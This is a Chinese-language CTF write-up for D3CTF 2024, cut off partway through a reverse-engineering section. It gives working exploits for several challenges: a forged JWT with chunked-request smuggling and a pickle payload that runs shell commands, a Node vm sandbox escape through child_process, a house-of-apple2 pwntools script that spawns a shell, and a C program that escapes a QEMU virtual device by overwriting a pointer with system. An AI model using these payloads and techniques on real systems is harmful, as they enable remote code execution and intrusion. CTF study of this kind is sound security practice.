0x00 前言
-------

本文是关于"凌武杯" D^3CTF 2024的详细题解，主要针对Web、Pwn、Re、Misc以及IoV等多方向题目的解题过程，包含但不限于pwn-web、cms、qemu、ipv6、iov、等等。如有错误，欢迎指正。

0x01 Web
--------

### d3pythonhttp

> I love using various Python web frameworks to create my projects~

fronted的admin路由有个jwt token验证

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714314472171-a742dd26-8486-4986-9e58-2767a3ca864d.png)

需要伪造token，在当前目录放一个frontend的app.py，执行脚本生成token

```php
import jwt

def get_key():
    try:
        with open("app.py", "r") as f:
            key = f.read()
    except:
        pass
    # print(key)
    return key

user_info = {"username": "w1nd", "isadmin": True}
key = get_key()
token = jwt.encode(user_info, key, algorithm="HS256", headers={"kid": "app.py"})
print("token="+token)
```

token验证后还有一个data条件判断

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714314531195-4bbbf325-6bb1-48b8-89f2-b9c272af79af.png)

[Transfer-Encoding:chunked详解\_transfer-encoding: chunked-CSDN博客](https://blog.csdn.net/qq_32331073/article/details/82148409)

构造下面那个**transfer encoding**块：

```php
def get_chunked(data):
    data = "{}\r\n{}\r\n0\r\n\r\n".format(hex(len(data))[2:], data)
    print(data)

chunked_data="BackdoorPasswordOnlyForAdmin"
get_chunked(chunked_data)
```

这样传值可以访问到backend的路由

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714313627490-461182a7-03b0-4df1-a16f-d94b81d35be8.png)

```php
POST /admin HTTP/1.1
Host: 127.0.0.1:8083
Transfer-Encoding: Chunked
Content-Type: text/plain
Content-Length: 49
Cookie: token=eyJhbGciOiJIUzI1NiIsImtpZCI6ImFwcC5weSIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IncxbmQiLCJpc2FkbWluIjp0cnVlfQ.4gIWuWq7pNmO_lkSjQ-FFhnjaYLKTJIFp-mCGgn39ug

5
MTIz
1c
BackdoorPasswordOnlyForAdmin
0
```

需要那个backdoor字符串才能往下走，但是backdoor路由的pickle反序列化又不能有这个backdoor字符串?，绕不过那个if语句，进入不到pickle反序列化

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714313627569-f6d49a00-b40c-472f-a22d-3eb3936d8563.png)

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714313627703-9a874472-dab7-4955-a7c8-4994228960a2.png)

请求包更改content-length可以截断body传递的值，现在直接改base64编码的部分即可，注意也要同时修改content-length的长度

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714313627690-2e4d5d36-5c82-4879-b626-106f8afe522e.png)

接下来就是pickle反序列化

```php
import base64
import jwt

def get_key():
    try:
        with open("app.py", "r") as f:
            # with open("/Users/w1nd/Desktop/ctf2024/d3ctf2024/2/debug/frontend/src/app.py", "r") as f:
            key = f.read()
    except:
        pass
    # print(key)
    return key

def get_token():
    user_info = {"username": "w1nd", "isadmin": True}
    key = get_key()
    token = jwt.encode(user_info, key, algorithm="HS256", headers={"kid": "app.py"})
    print("Cookie: token="+token)
    print("Transfer-Encoding: CHUNKED\nContent-Type: text/plain")

get_token()
def get_chunked(payload):
    data = "{}\r\n{}\r\n1c\r\nBackdoorPasswordOnlyForAdmin\r\n0\r\n\r\n".format(hex(len(payload))[2:], payload)
    print("Content-Length: {}\n".format(len(payload)))
    print(data)

def get_pickle_payload():
    payload=b'''cbuiltins
getattr
(cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
)RS'__builtins__'
tRS'exec'
tR(S'app.mapping[0]=("/", lambda: __import__("os").popen('cat /*').read())'
tR.
'''
    # app.add_mapping("/", lambda: "1234444")
    # app.mapping["/"].GET = lambda self: "1234"
    base64_data = base64.b64encode(payload)
    # print(base64_data.decode())
    return base64_data.decode()

data = get_pickle_payload()
get_chunked(data)
```

注意下执行的命令，一开始想反弹shell打不通，发现题目不出网，需要修改web.py的路由进行回显操作

```php
app.mapping[0]=("/", lambda: __import__("os").popen('cat /*').read())
```

以下是整个攻击流程发包：

第一个包，pickle反序列化修改路由

```php
POST /admin HTTP/1.1
Host: 139.224.222.124:30887
Cookie: token=eyJhbGciOiJIUzI1NiIsImtpZCI6ImFwcC5weSIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IncxbmQiLCJpc2FkbWluIjp0cnVlfQ.OXSneUzPrw4Jt6KfxNVWhdC2QjcNmaeD5ejXeT6VQRY
Transfer-Encoding: CHUNKED
Content-Type: text/plain
Content-Length: 252

fc
Y2J1aWx0aW5zCmdldGF0dHIKKGNidWlsdGlucwpnZXRhdHRyCihjYnVpbHRpbnMKZGljdApTJ2dldCcKdFIoY2J1aWx0aW5zCmdsb2JhbHMKKVJTJ19fYnVpbHRpbnNfXycKdFJTJ2V4ZWMnCnRSKFMnYXBwLm1hcHBpbmdbMF09KCIvIiwgbGFtYmRhOiBfX2ltcG9ydF9fKCJvcyIpLnBvcGVuKCdjYXQgLyonKS5yZWFkKCkpJwp0Ui4K
1c
BackdoorPasswordOnlyForAdmin
0
```

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714313627794-97da34c5-b25e-4734-98da-5b354328bb7f.png)

第二个包，访问触发命令执行，回显结果

```php
GET /backend HTTP/1.1
Host: 139.224.222.124:30887
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714313628197-f19852d6-d972-4981-a730-1036683e9208.png)

### stack\_overflow

> Eh？I pwn... really?

题目是用nodejs模仿栈，进行read和write，在栈中read/write前面三个参数分别为长度、地址和变量名

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714315179418-8eeee9fc-36db-4346-8c0d-86b899250dde.png)

然后将一大段code处理一下，扔进去run，循环判断，开始push和pop

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714315334788-d41b4970-7d1f-40f7-be4b-60bdb19a004e.png)

其中如果是call\_interface，就把栈里的东西拿出来到vm执行

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714315101257-c62ffa61-79bf-4174-bb4a-f26dacf4c6e3.png)

代码审计和动态调试一下，发现read是从stdin读取28个值，写入栈底，即前面一堆0到\[\[short - 3\]\]，也就是说能覆盖最后四个数，执行自己想要的命令

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714315585396-6c45e9d0-80d8-40ec-921b-06326d71022c.png)

题目过滤的`call_interface`和`{{}}`，这样我们就不能直接触发匿名函数和直接read/write地址了

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714322475495-b969eaaf-3759-4610-bac6-87f1ad5f1866.png)

我们直接写入27个数，同时让第27个数是个大数字（例如99），覆盖掉数字2，这样会和下面的write泄露信息，输出的内容中stdout前一个就是`[[ 0 ]]`了，也就是泄露pie基址

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714316037532-5ce35671-7bef-48ee-8eb8-c6efc61b94f4.png)

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714321312398-5bb865bd-549c-4177-92e5-e38ed9d8947a.png)

调试一下，发现pie+42就是 `(function (...a){  return a.map(char=>char.charCodeAt(0)).join(' ');})`匿名函数的地址

直接覆盖后四个值，write查看一下，没问题

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714321351141-20f13e31-9786-4c4a-aa3a-b921d182da1e.png)

然后是要read写入恶意代码覆盖函数

这里要vm沙箱逃逸，直接找个payload打，这里我们是直接写到参数'1'那里，恶意代码的单引号会和参数的单引号闭合，所以要用双引号+转义符

```php
(function (...a){  return this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"cat /f*\").toString();})
```

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714316886105-9dd3b985-7719-41fc-8189-2adb9c371424.png)

成功执行

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714317016658-3540f126-79a1-4988-8c14-2077dfd5443e.png)

```php
{
  "stdin": [
    "(function (...a){  return this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"cat /f*\").toString();})",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "1",
    "2708886779",
    "stdin",
    "read"
  ]
}
```

当然，也可以像下面这样，赋值给变量1，再read将变量1覆盖匿名函数，这样就不用考虑单引号闭合问题了

```php
{
    "1": [
        "(function (...a){  return this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /f*').toString();})"
    ],
    "stdin": [
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "10",
        "11",
        "12",
        "13",
        "14",
        "15",
        "16",
        "17",
        "18",
        "19",
        "20",
        "21",
        "22",
        "23",
        "24",
        "1",
        "1041341157",
        "1",
        "read"
    ]
}
```

### moonbox

> 请先本地打通再尝试远程环境：[http://106.54.28.21:9999，flag在docker-moonbox-server容器](http://106.54.28.21:9999)
> 
> 提示1http://121.36.61.207:9999/ <http://120.46.45.180:9999/>

<https://github.com/vivo/MoonBox>

日志的任务启动参数

```php
任务启动参数:curl -o sandboxDownLoad.tar http://127.0.0.1:8080/api/agent/downLoadSandBoxZipFile && curl -o moonboxDownLoad.tar http://127.0.0.1:8080/api/agent/downLoadMoonBoxZipFile && rm -fr ~/sandbox && rm -fr ~/.sandbox-module &&  tar  -xzf sandboxDownLoad.tar -C ~/ >> /dev/null && tar  -xzf moonboxDownLoad.tar -C ~/ >> /dev/null && dos2unix ~/sandbox/bin/sandbox.sh && dos2unix ~/.sandbox-module/bin/start-remote-agent.sh && rm -f moonboxDownLoad.tar sandboxDownLoad.tar && sh ~/.sandbox-module/bin/start-remote-agent.sh moon-box-web rc_id_1b8ab709e5318c36c9e6076d19d4949d&http://127.0.0.1:8080&INFO&INFO
```

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714317390225-09177ec5-d3ff-4d52-8530-0c53b1883493.png)

查看流量录制的任务启动参数知道了会对agent文件进行解压缩操作，然后分析一下两个agent文件，moonbox解压出来对应.sangbox-module目录，sanbox解压出来对应sandbox目录，然后启动参数会调用start-remote-agent.sh，start-remote-agent.sh会调用sandbox.sh，所以往这两个sh文件写入恶意的payload应该都行。

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714317433787-a93ced97-673d-4c88-842c-f5ac72d2d386.png)

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714317433775-9102335a-f552-46c7-9d79-4859631c10cf.png)

注意打包的命令

```php
# 解压
tar -xzf sandbox.tar -C ./
# 压缩
tar -czf sandbox-xxxx.tar sandbox/
```

上传两个压缩包

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714321562582-114f57a0-f4a7-4bbb-9da3-061076e0626d.png)

执行后查看日志

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714321595223-ac4d208a-f12e-4171-8440-98dee1180f8e.png)

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714317434014-a044b773-c613-459d-910f-117590640da8.png)

base64解码得到flag

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714317434050-46995088-aa47-4408-9e5f-47de703b02c1.png)

0x02 Pwn
--------

### d3note

> NoteTakingSoftware

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714317699678-2f499e5f-ea5f-4267-97d8-92f2d4e11c83.png)

有一个idx的越界，应该是打stdout这些

1. 往前存在一个地址addr:addr-&gt;stdout-&gt;\_IO\_2\_1\_stdout
2. 先泄露，然后再写入两次\_IO\_2\_1\_stdout
3. 就可以构造一个符合的结构体，进行读写
4. 然后用house of apple2打stdout

```php
from pwn import *
from pwnlib.util.iters import mbruteforce
from hashlib import sha256,md5
from Crypto.Cipher import ARC4
context.arch='amd64'
context.os='linux'
context.log_level='debug'

choice=0
if choice==1:
    p=process('./11')
else:
    p=remote("47.103.219.45",32249)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
sa      = lambda x,data             :p.sendafter(x, data)
sla     = lambda x,data             :p.sendlineafter(x, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
uru64   = lambda                    :uu64(ru('\x7f')[-6:])
leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))
libc_os   = lambda x                :libc_base + x
libc_sym  = lambda x                :libc_os(libc.sym[x])
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
def debug(cmd=''):
    gdb.attach(p,cmd)
    pause()
def proof_of_work(p):
    p.recvuntil(b"256(\"")
    prefixes = p.recvuntil(b'\"').decode("utf8")[:-1]
    log.success(prefixes)
    def brute(cur):
        content = prefixes + str(cur)
        s = sha256(content.encode())
        if s.hexdigest().startswith("000000") and int(s.hexdigest()[6:8], 16) < 0x40:
            return True
        return False
    proof = mbruteforce(brute,string.ascii_lowercase + string.digits, length=6, method='upto',threads=20)
    p.sendlineafter(b"zero:", proof)
def proof_of_work_md5(p):
    p.recvuntil(b"with \"")
    prefixes = p.recvuntil(b'\"').decode("utf8")[:-1]
    log.success(prefixes)
    def brute(cur):
        s = md5(cur.encode())
        if s.hexdigest().startswith(prefixes):
            return True
        return False
    proof = mbruteforce(brute,string.ascii_letters, length=4, method='fixed')
    p.sendlineafter(b":", proof)

elf=ELF('./11')
# libc=ELF('./libc-2.23.so')
# libc=ELF('./libc-2.27.so')
# libc=ELF('./libc-2.31.so')
libc=ELF('./libc.so.6')
# libc=ELF('./libc.so')

# rop = ROP(libc)
# rdi=(rop.find_gadget(['pop rdi', 'ret']))[0]
# rsi=(rop.find_gadget(['pop rsi', 'ret']))[0]

def add(idx,size,cont):
    sl(str(0x114))
    sl(str(idx))
    sl(str(size))
    sl(cont)

def edit(idx,cont):
    sl(str(0x810))
    sl(str(idx))
    sl(cont)

def show(idx):
    sl(str(0x514))
    sl(str(idx))

def dele(idx):
    sl(str(0x1919))
    sl(str(idx))
#0x4040A0
#0x400620
show(-0x3a8)
libc_base=uu64(r(6))
r(1)
leak("libc_base")
pl=flat(libc_base,libc_base)
edit(-0x5b7,pl)
file_addr=libc_base
libc_base=libc_base-libc.sym['_IO_2_1_stdout_']

lock=0x4040A0+0x500
file_offset=0
_IO_wfile_jumps=libc_sym('_IO_wfile_jumps')
fake_file=flat({
        file_offset+0x00:b'  sh;',
        file_offset+0x28:1,
    file_offset+0x68:libc_sym('system'),
    file_offset+0x88:lock,
    file_offset+0xa0:file_addr,
    file_offset+0xd8:_IO_wfile_jumps-0x20,
    file_offset+0xe0:file_addr,
},filler='\x00')

edit(-4,fake_file)

sl(str(114514))

p.interactive()
```

### D3BabyEscape

> Welcome to D3BabyEscape and have fun!

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714317778804-85b7f4d9-1464-45ef-b0e8-297eabb5912d.png)

申请了这个pci设备

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714317778938-64b3fb08-0b3b-4fb3-8b12-d9dfe3819579.png)

可能是改下面这个？

如果可以往3400的位置写上system的地址

n\_4为/bin/sh的话

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714317779035-621dfab4-4271-4c27-8b4b-79575adf7871.png)

pmio的端口比较像这个

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714317779071-213ab28e-cefb-4ebd-99fc-fafcb2d31870.png)

3400偏移处是函数地址

0xa00偏移处可以修改，然后任意地址

1. mmio\_write修改0xa00处的值，改成合适的大小
2. mmio\_read输出3400处的rand\_r函数地址，计算偏移得到system地址
3. 利用pmio\_read中触发666的检测
4. 利用pmio\_read中if条件里的越界写3400处为system
5. 最后调用system("sh;");

这里写入的value只能是4个字节，不知原因是什么  
但最后远程能打通，可能本地环境有问题

```php
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/io.h>

uint64_t pmio_base = 0x0000c000;
uint64_t mmio_mem;

uint64_t mmio_read(uint64_t addr){
    return *(uint64_t *)((uint64_t)mmio_mem + (uint64_t)addr );
}

void mmio_write(uint64_t addr,uint64_t val ){
    *(uint64_t *)((uint64_t)mmio_mem + (uint64_t)addr) = (uint64_t)val;
}

void pmio_write(uint64_t addr,uint64_t val){
    outl((uint64_t)val,(uint64_t)addr+(uint64_t)pmio_base);
}

uint64_t pmio_read(uint64_t addr){
    return (uint64_t)inl((uint64_t)addr+(uint64_t)pmio_base);
}

int main(){

    setbuf(stdout,0);
    setbuf(stdin,0);
    setbuf(stderr,0);
    if (iopl(3) < 0) {
        printf("failed to change i/o privilege! no root?");
    }
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR | O_SYNC);
    if(mmio_fd==-1){  perror("mmio failed");exit(-1);  }
    mmio_mem = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,0);     //mmap mmio space
    if(mmio_mem == MAP_FAILED){ perror("map mmio failed");exit(-1);}
    printf("addr of mmio:%p\n",mmio_mem);

    mmio_write(0x80,0xff);
    size_t leak=mmio_read(0x15);
    printf("leak: 0x%lx\n",leak);
    size_t system_addr=leak+0x782dcc850d70-0x782dcc846780;
    printf("system: 0x%lx\n",system_addr);

    mmio_write(0x50,666);
    size_t may_666=pmio_read(0x50);
    printf("may 666: %lu\n",may_666);
    mmio_write(0x80,0xff-0x35-6);
    pmio_write(0x50,system_addr);
    mmio_write(0x80,0xff-0x35+4-6);
    pmio_write(0x50,system_addr>>32);
    mmio_write(0x80,0xff-0x35);
    size_t leak_system=mmio_read(0x50);
    printf("leak_system: 0x%lx\n",leak_system);
    mmio_write(0x40,0x6873);

    return 0;
}
```

0x03 Re
-------

### RandomVM

> The days that you can easily dump or patch my VM code are over. If you want it, then you have to take it.

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714318024856-a36bd152-c3ec-4ecc-ac4f-805bf6bf6008.png)

flag长度为12

种子固定的

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714318024970-c8d5da22-23ff-4256-bbec-58bc37efcba5.png)

应该是v2里面按种子来rand取然后加上地址进行偏移

xref一下rand可以找到很多

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714318024938-db89b9f3-2963-49f0-b2d3-95de0aca1292.png)

要先放入内存

动调了一下基本就是上面说的这回事

byte\_B080应该是寄存器，似乎只用到4位，然后byte\_B0B2作为index

要用linux解这题才行（

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714318024990-3d5644b7-3752-40d6-8efe-6d6fcd470e6a.png)

接收输入的地方syscall会有两种使用，一个是read

[Linux系统调用表(system call table)](https://blog.csdn.net/shuzishij/article/details/87005219)

[read() SysCall Internals](https://pmateti.github.io/Courses/4420/Lectures/Hardening/SysCalls/read-syscall.html#:~:text=read%20%28%29%20SysCall%20Internals%201%201%20An%20Example%3A,2%202%20References%20http%3A%2F%2Fwww.quora.com%2FLinux-Kernel%2FWhat-does-asmlinkage-mean-in-the-definition-of-system-calls%20http%3A%2F%2Fgcc.gnu.org%2Fonlinedocs%2Fgcc%203%203%20End)

还有一个是[Linux inotify功能及原理（inotify\_init、inotify\_add\_watch、inotify\_rm\_watch、read）](https://blog.csdn.net/wteruiycbqqvwt/article/details/112790372)

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714318024955-16ca9034-14e2-4072-bd95-e5409650a356.png)

中途会执行rand，让程序流变化

似乎有pattern的

接收输入的一个位，然后进行运算，运算是左右位移，然后拿去和读的下一位进行异或

进行的运算

```php
*((_BYTE *)&unk_5573CC65F040 + (unsigned __int8)byte_5573CC65F072) = ((int)*((unsigned __int8 *)&unk_5573CC65F040
    + (unsigned __int8)byte_5573CC65F072) >> byte_5573CC65F080[byte_5573CC65F0B2]) | (*((_BYTE *)&unk_5573CC65F040 + (unsigned __int8)byte_5573CC65F072) << (8 - byte_5573CC65F080[byte_5573CC65F0B2]));
```

挺抽象的

后面还有这个

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714318025568-35f3c172-8be3-471d-ac4c-8ddfc88aa667.png)

```php
import idc
import idaapi
import idautils

rand_ch = 'E8 ?? ?? ?? ?? 89 C1 48 63 C1 48 69 C0 67 66 66 66'  # rand函数附近的特征值
xor_ch = '48 8B 44 C5 A0'  # xor操作上面的分配内存的特征值，分配完内存后就马上放入需要xor的值了
functions = [0x717F]
functions_dict = {}

class MyVisitor(idaapi.ctree_visitor_t):
    def __init__(self, cfunc):
        idaapi.ctree_visitor_t.__init__(self, idaapi.CV_FAST)
        self.cfunc = cfunc
        self.values = []

    def visit_expr(self, expr) -> "int":
        if expr.op != idaapi.cot_asg:
            # 不是赋值语句跳过
            return 0
        _x = expr.x  # x是第一个操作数
        _y = expr.y  # y是第二个操作数
        # 判断是否满足变量和立即数的条件
        if _x.op == idaapi.cot_idx and _y.op == idaapi.cot_num:
            # e.g. v3 = 100，
            num = _y.n.value(_y.type)  # 获取立即数的数值
            if num == 0:
                return 0
            self.values.append(num)
        return 0

def search_xor_value(func_end):
    xor_addr = idc.find_binary(func_end, SEARCH_UP, xor_ch)
    xor_tmp_addr = idc.find_code(xor_addr, SEARCH_DOWN)
    xor_value = idc.print_operand(xor_tmp_addr, 1)
    xor_value = xor_value.strip('h')
    xor_value = int(xor_value, 16)
    return xor_value

def fill_function_arr(start, input):
    global functions
    global functions_dict
    func_start = start
    func_end = idc.find_func_end(func_start)
    xor_value = search_xor_value(func_end)
    func_arr = []
    for i in range(len(input)):
        tmp = input[i]
        tmp ^= xor_value
        func_arr.append((func_start + tmp) & 0xffff)
    if all(elem in set(func_arr) for elem in functions):
        pass
    else:
        functions.extend(func_arr)
    tmp = list(set(functions))
    tmp.sort(key=functions.index)
    functions = tmp
    functions_dict[f'{functions.index(func_start)}'] = []
    for i in func_arr:
        functions_dict[f'{functions.index(func_start)}'].append(functions.index(i))

def main():
    length = 1
    i = 0
    while i < length:
        if functions[i] > 0x79BE or functions[i] < 0x1110:
            continue
        func = idaapi.get_func(functions[i])  # 获取当前位置的函数
        cfunc = idaapi.decompile(func.start_ea)  # 反编译函数
        my_visitor = MyVisitor(cfunc)
        my_visitor.apply_to(cfunc.body, None)
        fill_function_arr(functions[i], my_visitor.values)
        i += 1
        length = len(functions)
    print(functions_dict)

if __name__ == '__main__':
    main()
```

这次没啥大问题了

共获得114个函数，116是因为有函数里面调了rand()，所以xref出来116个，实际上是114个

获取伪代码

```php
import idc
import idaapi
import idautils

rand_ch = 'E8 ?? ?? ?? ?? 89 C1 48 63 C1 48 69 C0 67 66 66 66'  # rand函数附近的特征值
xor_ch = '48 8B 44 C5 A0'  # xor操作上面的分配内存的特征值，分配完内存后就马上放入需要xor的值了
functions = [29055, 27592, 13322, 10519, 11699, 25139, 20259, 5880, 7714, 12164, 21929, 24654, 14117, 8117, 9253, 27929, 28821, 9892, 16142, 9649, 17148, 20991, 22134, 25811, 12376, 14681, 17346, 15944, 9435, 7912, 20482, 10097, 15121, 28152, 17999, 25331, 7376, 6732, 26053, 6287, 28598, 23700, 27255, 18963, 4974, 18686, 22579, 13669, 15344, 29260, 15746, 16587, 24916, 8578, 26276, 14454,
             21229, 9015, 17776, 24155, 11015, 27057, 9242, 5434, 11476, 13064, 10777, 30487, 29557, 25554, 22356, 11229, 30729, 23471, 10314, 22823, 21452, 19992, 23917, 8346, 24412, 7153, 18222, 23209, 12599, 6930, 26523, 29794, 6509, 14923, 4776, 16810, 18459, 28375, 17578, 26790, 6078, 30961, 13883, 19794, 8801, 15548, 12822, 20739, 30017, 11922, 21706, 5648, 19596, 16340, 30264, 5232, 4553, 19215]
oprations = {}

def decompile_func(ea):
    if not idaapi.init_hexrays_plugin():
        return False

    f = idaapi.get_func(ea)
    if f is None:
        return False

    cfunc = idaapi.decompile(f)
    if cfunc is None:
        # Failed to decompile
        return False

    lines = []
    sv = cfunc.get_pseudocode()
    for sline in sv:
        line = idaapi.tag_remove(sline.line)
        lines.append(line)
    return "\n".join(lines)

def split_list(data, split_element):
    result = []
    temp_list = []

    for element in data:
        if element == split_element:
            if temp_list:
                result.append(temp_list)
            temp_list = [element]
        else:
            temp_list.append(element)

    if temp_list:
        result.append(temp_list)

    return result

def main():
    length = len(functions)
    i = 0
    while i < length:
        if functions[i] > 0x79BE or functions[i] < 0x1110:
            continue
        pscode = decompile_func(functions[i])
        alist = split_list(pscode, '\n')
        if len(alist) <= 4:
            oprations[i] = "empty"
            pass
        elif "".join(alist[5][3:])[:2] == "if":
            oprations[i] = "".join(alist[5][3:]) + ": rand();"
        else:
            oprations[i] = "".join(alist[5][3:-1])
        i += 1
    print(oprations)

if __name__ == '__main__':
    main()
```

获取伪代码

```php
function_dict = {'0': [1, 2, 3, 4, 5, 6, 7, 8, 9, 4], '1': [10, 11, 12, 3, 13, 14, 15, 16, 7, 17], '2': [18, 19, 20, 21, 18, 22, 23, 24, 18, 25], '3': [2, 26, 27, 28, 28, 29, 10, 30, 14, 31], '4': [32, 33, 11, 34, 35, 15, 35, 4, 33, 15], '5': [2, 36, 5, 2, 5, 5, 37, 2, 2, 37], '6': [7, 4, 24, 35, 32, 32, 38, 35, 39, 11], '7': [40, 40, 2, 37, 41, 5, 41, 36, 41, 42], '8': [37, 43, 28, 28, 36, 37, 2, 2, 41, 20], '9': [44, 29, 45, 25, 46, 47, 48, 9, 25, 49], '10': [41, 35, 50, 50, 51, 25, 22, 51, 18, 52], '11': [53, 54, 55, 56, 39, 35, 35, 6, 57, 58], '12': [10, 3, 59, 45, 14, 60, 44, 57, 49, 54], '13': [38, 14, 61, 15, 34, 62, 22, 63, 14, 27], '14': [64, 9, 65, 65, 45, 66, 45, 66, 65, 66], '15': [33, 33, 39, 54, 40, 51, 54, 4, 34, 4], '16': [58, 67, 68, 67, 69, 6, 38, 70, 67, 25], '17': [30, 12, 9, 22, 11, 35, 9, 70, 71, 55], '18': [3, 3, 48, 22, 10, 22, 48, 18, 25, 18], '19': [28, 72, 20, 73, 29, 17, 58, 73, 74, 2], '20': [24, 67, 16, 16, 42, 36, 27, 75, 69, 23], '21': [17, 10, 76, 59, 21, 28, 17, 77, 78, 60], '22': [60, 29, 28, 50, 16, 46, 28, 16, 68, 65], '23': [65, 78, 50, 17, 49, 79, 21, 30, 22, 49], '24': [64, 80, 81, 82, 83, 52, 26, 79, 64, 77], '25': [76, 63, 74, 3, 48, 44, 60, 9, 17, 10], '26': [84, 30, 85, 43, 85, 81, 72, 72, 43, 86], '27': [19, 66, 45, 45, 45, 66, 45, 66, 65, 45], '28': [70, 9, 18, 20, 50, 87, 32, 6, 4, 68], '29': [57, 42, 68, 88, 89, 38, 86, 69, 67, 87], '30': [80, 11, 79, 24, 52, 53, 88, 58, 58, 55], '31': [6, 28, 42, 19, 51, 19, 66, 4, 86, 90], '32': [57, 15, 87, 39, 35, 32, 35, 40, 54, 87], '33': [34, 51, 15, 40, 33, 34, 40, 54, 5, 34], '34': [51, 51, 15, 75, 33, 34, 39, 15, 1, 5], '35': [11, 15, 11, 54, 6, 58, 6, 57, 32, 40], '36': [18, 91, 54, 89, 92, 68, 68, 64, 21, 80], '37': [8, 91, 5, 8, 2, 7, 37, 5, 5, 7], '38': [57, 56, 30, 93, 59, 57, 87, 41, 56, 88], '39': [35, 33, 1, 56, 40, 40, 39, 53, 15, 56], '40': [6, 51, 59, 54, 11, 4, 4, 40, 33, 54], '41': [36, 65, 37, 8, 36, 7, 7, 37, 37, 94], '42': [28, 83, 21, 74, 75, 92, 62, 73, 52, 51], '43': [69, 38, 85, 24, 95, 24, 82, 55, 64, 43], '44': [66, 80, 96, 20, 25, 97, 27, 48, 31, 12], '45': [13, 31, 62, 94, 13, 90, 78, 78, 78, 73], '46': [41, 26, 67, 21, 6, 80, 31, 20, 25, 68], '47': [10, 7, 33, 45, 35, 1, 10, 9, 96, 98], '48': [70, 50, 50, 51, 34, 25, 33, 50, 70, 92], '49': [7, 23, 14, 67, 71, 25, 99, 97, 14, 60], '50': [60, 18, 25, 50, 68, 65, 45, 10, 22, 48], '51': [12, 12, 5, 51, 34, 15, 68, 54, 34, 51], '52': [93, 38, 43, 93, 83, 83, 26, 69, 86, 84], '53': [38, 56, 55, 53, 57, 38, 53, 75, 12, 59], '54': [40, 4, 32, 39, 6, 34, 4, 54, 15, 4], '55': [64, 88, 93, 55, 30, 87, 88, 87, 93, 43], '56': [32, 56, 53, 39, 40, 56, 38, 32, 39, 56], '57': [
